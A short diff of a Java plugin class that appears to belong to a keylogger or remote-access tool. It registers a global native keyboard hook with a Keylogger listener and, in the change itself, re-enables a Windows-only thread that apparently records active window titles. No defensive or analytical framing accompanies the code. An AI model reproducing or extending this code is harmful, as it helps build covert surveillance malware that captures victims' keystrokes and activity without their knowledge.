@@ -22,13 +22,13 @@ public class Plugin extends StubPlugin {
 		GlobalScreen.registerNativeHook();
 		GlobalScreen.getInstance().addNativeKeyListener(new Keylogger());
 		
-		/*if (System.getProperty("os.name").toLowerCase().contains("win")) {
+		if (System.getProperty("os.name").toLowerCase().contains("win")) {
 			try {
 				new Thread(new TitleListener()).start();
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
-		}*/
+		}
 		
 		Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
 
